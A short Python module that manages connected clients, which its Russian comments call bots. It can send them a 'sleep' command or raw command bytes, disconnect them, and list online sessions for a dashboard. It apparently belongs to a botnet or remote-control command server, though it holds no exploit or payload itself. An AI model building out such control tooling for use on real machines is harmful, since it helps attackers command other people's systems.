# backend/Services/ClientManager.py

from logs import Log as logger

# Глобальный реестр активных соединений {id: (reader, writer)}
client = {}

async def close_client(client_id, send_sleep=True):
    """Принудительное отключение конкретного клиента"""
    if client_id not in client:
        return False
        
    _, writer = client[client_id]
    try:
        if send_sleep:
            writer.write(b"sleep\n")
            await writer.drain()
        writer.close()
        await writer.wait_closed()
    except:
        pass
    finally:
        client.pop(client_id, None)
        logger.info(f"[-] Бот {client_id} отключен")
    return True

async def close_all_client():
    """Массовое отключение всех ботов (например, при выключении сервера)"""
    ids = list(client.keys())
    for cid in ids:
        await close_client(cid)
    return len(ids)

def list_clients():
    """Список текущих онлайн-сессий для Dashboard"""
    return [{"id": cid, "status": "online"} for cid in client.keys()]

async def send_binary_to_bot(bot_id, packet):
    """Низкоуровневая отправка сырых байтов (команды API)"""
    if bot_id in client:
        try:
            _, writer = client[bot_id]
            writer.write(packet)
            await writer.drain()
            return True
        except Exception as e:
            logger.error(f"[Services] Send error to {bot_id}: {e}")
    return False